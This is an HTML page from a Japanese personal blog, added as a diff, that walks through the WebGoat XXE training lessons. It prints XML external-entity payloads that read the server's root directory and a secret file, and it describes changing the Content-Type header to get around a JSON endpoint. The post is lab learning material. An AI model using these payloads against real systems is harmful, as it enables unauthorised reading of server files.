@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<title>WebGoat-15: XXE - グリのクソブログ</title>
+	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
+	<meta name="description" content="">
+		<meta property="og:title" content="WebGoat-15: XXE" />
+<meta property="og:description" content="XXE (Xml eXternal Entity attack) とは、XMLの外部参照機能を悪用する攻撃。" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://guricerin.github.io/shit-blog/post/2020/09/27-xxe/" />
+<meta property="article:published_time" content="2020-09-27T18:17:30+09:00" />
+<meta property="article:modified_time" content="2020-09-27T18:17:30+09:00" />
+
+		<meta itemprop="name" content="WebGoat-15: XXE">
+<meta itemprop="description" content="XXE (Xml eXternal Entity attack) とは、XMLの外部参照機能を悪用する攻撃。">
+<meta itemprop="datePublished" content="2020-09-27T18:17:30&#43;09:00" />
+<meta itemprop="dateModified" content="2020-09-27T18:17:30&#43;09:00" />
+<meta itemprop="wordCount" content="51">
+
+
+
+<meta itemprop="keywords" content="" />
+		<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="WebGoat-15: XXE"/>
+<meta name="twitter:description" content="XXE (Xml eXternal Entity attack) とは、XMLの外部参照機能を悪用する攻撃。"/>
+
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+	<link rel="dns-prefetch" href="//fonts.googleapis.com">
+	<link rel="dns-prefetch" href="//fonts.gstatic.com">
+	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">
+
+	<link rel="stylesheet" href="https://guricerin.github.io/shit-blog/css/style.css">
+	<link rel="stylesheet" href="https://guricerin.github.io/shit-blog/css/custom.css">
+
+	<link rel="shortcut icon" href="https://guricerin.github.io/shit-blog/favicon.ico">
+		
+</head>
+<body class="body">
+	<div class="container container--outer">
+		<header class="header">
+	<div class="container header__container">
+		
+	<div class="logo logo--mixed">
+		<a class="logo__link" href="https://guricerin.github.io/shit-blog/" title="グリのクソブログ" rel="home">
+			<div class="logo__item logo__imagebox">
+					<img class="logo__img" src="https://guricerin.github.io/shit-blog/img/icon.jpg">
+				</div><div class="logo__item logo__text">
+					<div class="logo__title">グリのクソブログ</div>
+					<div class="logo__tagline">主にB&#39;z</div>
+				</div>
+		</a>
+	</div>
+		
+<nav class="menu">
+	<button class="menu__btn" aria-haspopup="true" aria-expanded="false" tabindex="0">
+		<span class="menu__btn-title" tabindex="-1">Menu</span>
+	</button>
+	<ul class="menu__list">
+		<li class="menu__item">
+			<a class="menu__link" href="https://guricerin.github.io/shit-blog/archives">
+				
+				<span class="menu__text">ARCHIVE</span>
+				
+			</a>
+		</li>
+		<li class="menu__item">
+			<a class="menu__link" href="https://guricerin.github.io/shit-blog/feed.xml">
+				
+				<span class="menu__text">RSS</span>
+				
+			</a>
+		</li>
+	</ul>
+</nav>
+
+	</div>
+</header>
+		<div class="wrapper flex">
+			<div class="primary">
+			
+<main class="main" role="main">
+	<article class="post">
+		<header class="post__header">
+			<h1 class="post__title">WebGoat-15: XXE</h1>
+			<div class="post__meta meta">
+<div class="meta__item-datetime meta__item">
+	<svg class="meta__icon icon icon-time" width="16" height="14" viewBox="0 0 30 28"><path d="M15 0C7 0 1 6 1 14s6 14 14 14 14-6 14-14S23 0 15 0zm0 25C9 25 4 20 4 14S9 3 15 3s11 5 11 11-5 11-11 11zm1-18h-2v8.4l6.8 4.4L22 18l-6-3.8V7z"/></svg><time class="meta__text" datetime="2020-09-27T18:17:30&#43;09:00">2020-09-27</time></div><div class="meta__item-categories meta__item"><svg class="meta__icon icon icon-category" width="16" height="16" viewBox="0 0 16 16"><path d="m7 2l1 2h8v11h-16v-13z"/></svg><span class="meta__text"><a class="meta__link" href="https://guricerin.github.io/shit-blog/categories/%E6%83%85%E5%A0%B1%E3%82%BB%E3%82%AD%E3%83%A5%E3%83%AA%E3%83%86%E3%82%A3/" rel="category">情報セキュリティ</a>
+	</span>
+</div></div>
+		</header>
+		<div class="content post__content clearfix">
+			<p>XXE (Xml eXternal Entity attack) とは、XMLの外部参照機能を悪用する攻撃。</p>
+<h4 id="page-4">Page 4</h4>
+<p>XXEインジェクションを用いてサーバのrootディレクトリ内をリスト表示せよ、という課題。<br>
+適当に<code>hoge</code>とコメントしてみる。</p>
+<p><img src="./1.png" alt="a"></p>
+<p>この時のリクエストは以下のようになっている。</p>
+<p><img src="./2.png" alt="a"></p>
+<p>リクエスト・ボディがXML形式なので、ここにXXEインジェクションを活用できそうだ。<br>
+<code>&lt;text&gt;</code>タグに入力したコメントが挿入されて画面表示されるので、XXEインジェクションは以下のようになる。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34;?&gt;&lt;!DOCTYPE xxe [&lt;!ENTITY root SYSTEM &#34;file:///&#34;&gt;</span> ]&gt;<span style="color:#f92672">&lt;comment&gt;</span>  <span style="color:#f92672">&lt;text&gt;</span>&amp;root;<span style="color:#f92672">&lt;/text&gt;&lt;/comment&gt;</span> 
+</code></pre></div><p>owasp zapでコメント投稿をブレークさせ、上記のxmlをリクエスト・ボディに貼っつけて送信。</p>
+<p><img src="./3.png" alt="a"></p>
+<p>課題クリア。</p>
+<p><img src="./4.png" alt="a"></p>
+<h4 id="page-7">Page 7</h4>
+<p>Page 4と同じ課題だが、コメントを投稿したときのリクエスト・ボディがJSON形式になっている。</p>
+<p><img src="./5.png" alt="a"></p>
+<p>では<code>Content-Type</code>を<code>application/xml</code>に改ざんした上でPage 4と同様のリクエスト・ボディを送信すればよいのではないか？<br>
+と思ったら正解だった。</p>
+<p><img src="./6.png" alt="a"></p>
+<p>サーバで用いられているフレームワークによっては意図しない形式のデータを処理するかもしれない、という教訓。</p>
+<h4 id="page-11">Page 11</h4>
+<p>WebGoatサーバ内の機密ファイルをWebWolfサーバに送信せよ、という課題。<br>
+試しにそのファイル内容を確認してみる。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;</span>
+<span style="color:#75715e">&lt;!DOCTYPE xxe [
+</span><span style="color:#75715e">  &lt;!ENTITY secret SYSTEM &#34;file:///home/webgoat/.webgoat-8.1.0/XXE/secret.txt&#34;&gt;</span>
+]&gt;
+<span style="color:#f92672">&lt;comment&gt;&lt;text&gt;</span>&amp;secret;<span style="color:#f92672">&lt;/text&gt;&lt;/comment&gt;</span>
+</code></pre></div><p><img src="./7.png" alt="a"></p>
+<p>ファイル内容が表示された。</p>
+<p><img src="./8.png" alt="a"></p>
+<p>まあここで詰まったんですがね。</p>
+		</div>
+	</article>
+</main>
+
+
+<nav class="pager flex">
+	<div class="pager__item pager__item--prev">
+		<a class="pager__link" href="https://guricerin.github.io/shit-blog/post/2020/09/26-insecure-login/" rel="prev">
+			<span class="pager__subtitle">«&thinsp;Previous</span>
+			<p class="pager__title">WebGoat-14: Insecure Login</p>
+		</a>
+	</div>
+	<div class="pager__item pager__item--next">
+		<a class="pager__link" href="https://guricerin.github.io/shit-blog/post/2020/09/20200930-bash-local-var/" rel="next">
+			<span class="pager__subtitle">Next&thinsp;»</span>
+			<p class="pager__title">bashの定数・ローカル変数宣言</p>
+		</a>
+	</div>
+</nav>
+
+<section class="comments">
+	<div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "https-guricerin-github-io-shit-blog" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+
+
+			</div>
+			
+
+		</div>
+		<footer class="footer">
+	<div class="container footer__container flex">
+		
+		<div class="footer__copyright">
+			&copy; 2021 guricerin.
+			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
+		</div>
+	</div>
+</footer>
+	</div>
+<script async defer src="https://guricerin.github.io/shit-blog/js/menu.js"></script>
+<script src="https://guricerin.github.io/shit-blog/js/custom.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML" async></script>
+</body>
+</html>
